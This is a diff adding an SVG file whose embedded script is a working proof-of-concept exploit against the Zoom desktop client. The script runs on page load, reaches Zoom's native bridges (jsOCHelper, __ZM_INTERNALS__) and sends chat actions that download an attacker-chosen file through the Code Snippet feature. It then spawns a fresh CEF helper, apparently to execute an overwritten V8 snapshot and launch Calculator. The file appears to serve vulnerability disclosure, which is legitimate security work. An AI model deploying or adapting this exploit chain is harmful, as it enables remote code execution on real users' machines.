@@ -1,0 +1,110 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="760" height="240" viewBox="0 0 760 240">
+  <rect width="760" height="240" fill="#173b55"/>
+  <text id="status" x="20" y="52" fill="white" font-size="18">Zoom 7.2.2 Code Snippet proof</text>
+  <text id="detail" x="20" y="86" fill="#d9efff" font-size="14">Checking the stock Zoom Docs realm…</text>
+  <script><![CDATA[
+(async()=>{
+  'use strict';
+  const q=new URLSearchParams(location.search);
+  const session=q.get('s'),message=q.get('m'),file=q.get('f');
+  const dialog='https://zoom.us/',proof=q.get('r');
+  const status=document.getElementById('status'),detail=document.getElementById('detail');
+  const delay=ms=>new Promise(resolve=>setTimeout(resolve,ms));
+  const setStage=stage=>{detail.textContent=stage};
+  const docsWindows=()=>{
+    const seen=new Set(),queue=[self,parent,top],out=[];
+    while(queue.length&&seen.size<32){
+      const win=queue.shift();
+      if(!win||seen.has(win))continue;
+      seen.add(win);
+      try{
+        if(win.location.origin!=='https://docs.zoom.us')continue;
+        out.push(win);
+        for(let i=0;i<win.frames.length;i++)queue.push(win.frames[i]);
+      }catch(_){}
+    }
+    return out;
+  };
+  const resolveInternals=()=>{
+    for(const win of docsWindows())try{
+      if(typeof win.__ZM_INTERNALS__?.invoke==='function')return win.__ZM_INTERNALS__;
+    }catch(_){}
+    throw new Error('Zoom native bridge was not reachable');
+  };
+  const resolveHelper=()=>{
+    for(const win of docsWindows())try{
+      const candidate=win.webkit?.messageHandlers?.jsOCHelper;
+      if(typeof candidate?.postMessage==='function')return candidate;
+    }catch(_){}
+    throw new Error('Zoom jsOCHelper was not reachable');
+  };
+  try{
+    const hostWindow=docsWindows().find(win=>{
+      try{return win.location.pathname.startsWith('/doc/')}catch(_){return false}
+    });
+    if(!hostWindow)throw new Error('stock Zoom Docs host window was not reachable');
+    const hostUrl=new URL(hostWindow.location.href);
+    const openedFromCalendar=hostUrl.searchParams.get('from')==='zoom_event_card'&&
+      hostUrl.searchParams.get('skipCheck')==='1';
+    const openedFromCanvas=hostUrl.search===''&&hostUrl.hash==='';
+    const openedFromNotification=hostUrl.searchParams.get('from')==='notification'&&
+      hostUrl.searchParams.get('dest')==='notification'&&
+      /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
+        hostUrl.searchParams.get('notificationId')||''
+      );
+    const guardFailures=[];
+    if(location.origin!=='https://docs.zoom.us')guardFailures.push('origin');
+    if(!location.pathname.startsWith('/api/file/'))guardFailures.push('file-path');
+    if(top===self)guardFailures.push('not-framed');
+    if(hostUrl.origin!=='https://docs.zoom.us'||!hostUrl.pathname.startsWith('/doc/'))guardFailures.push('host');
+    if(!(openedFromCalendar||openedFromCanvas||openedFromNotification))guardFailures.push('entry:'+hostUrl.search+hostUrl.hash);
+    if(!/\bZoomDocsClient\/1\.0\.0\b/.test(navigator.userAgent))guardFailures.push('ua:'+navigator.userAgent.slice(-48));
+    if(!/^[0-9a-f]{32}@conference\.xmpp\.zoom\.us$/i.test(session||''))guardFailures.push('session');
+    if(!/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(message||''))guardFailures.push('message');
+    if(!/^proof[0-9a-f]{32}$/.test(proof||''))guardFailures.push('proof');
+    if(guardFailures.length)throw new Error('stock guard failed: '+guardFailures.join(', '));
+    const helper=resolveHelper();
+    const topGuard='__ZOOM_CODESNIPPET_RCE_ONESHOT_'+proof;
+    if(Object.prototype.hasOwnProperty.call(top,topGuard))throw new Error('one-shot proof already ran');
+    Object.defineProperty(top,topGuard,{value:true,configurable:false,enumerable:false,writable:false});
+    const nativeCall=(apiName,data)=>helper.postMessage(JSON.stringify({
+      jsCallId:'poc_native_'+Date.now()+'_'+Math.random().toString(16).slice(2),apiName,data
+    }));
+    const publish=(action,params={})=>nativeCall('zmAppBridgePub',{
+      service:'chat',data:JSON.stringify({
+        action,params,jsCallId:'poc_action_'+Date.now()+'_'+Math.random().toString(16).slice(2)
+      })
+    });
+
+    setStage('Native bridge reached; opening the controlled channel…');
+    publish('DLAct_SwitchToNativeChat',{});
+    await delay(1800);
+    publish('DLAct_Chat',{jid:session,forceNativeChat:true});
+    await delay(15000);
+    publish('DLAct_GetFileWithMsgIDAndFileIndex',{sessionId:session,msgId:message,fileIndex:0});
+    await delay(1000);
+    publish('DLAct_DownloadFileForMsgInSession',{
+      sessionId:session,msgId:message,fileIndex:0,isRebuildConnection:false,isManual:false
+    });
+    setStage('Waiting for Code Snippet extraction…');
+    await delay(20000);
+    publish('DLAct_Chat',{jid:session,forceNativeChat:true});
+    await delay(10000);
+    publish('DLAct_GetCodeSnippetPreviewInfo',{sessionId:session,messageId:message});
+    await delay(5000);
+
+    const bridge=resolveInternals();
+    status.textContent='Starting a fresh Zoom CEF helper…';
+    setStage('The overwritten V8 snapshot runs before the page loads.');
+    await bridge.invoke('unifywebview','dialog','create',{params:{
+      url:dialog,title:'Controlled Calculator proof',width:620,height:460,
+      isShowTitleBar:true,isAllowResize:true,featureName:'NewHomePage',forceCEF:true
+    }},{timeout:30});
+    setStage('Fresh CEF helper created; wait for Calculator.');
+  }catch(error){
+    status.textContent='Proof stopped';
+    detail.textContent=String(error?.message||error);
+  }
+})();
+  ]]></script>
+</svg>
